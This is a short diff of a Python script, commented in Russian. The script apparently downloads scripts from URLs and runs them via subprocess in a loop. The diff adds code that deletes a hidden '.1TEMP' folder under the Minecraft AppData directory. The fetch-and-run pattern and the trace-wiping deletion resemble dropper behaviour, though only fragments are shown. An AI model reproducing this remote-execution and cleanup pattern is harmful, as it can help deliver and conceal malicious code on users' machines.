@@ -2,6 +2,7 @@ import os
 import requests
 import subprocess
 import time
+import shutil
 
 def run_script(script_url):
     # Загружаем содержимое скрипта по его URL
@@ -33,3 +34,6 @@ if __name__ == "__main__":
         
         # Пауза между запусками скриптов (например, 5 секунд)
         time.sleep(3)
+
+    # Удаляем папку %appdata%\.minecraft\.1TEMP
+    shutil.rmtree(os.path.join(os.getenv('APPDATA'), '.minecraft', '.1TEMP'))
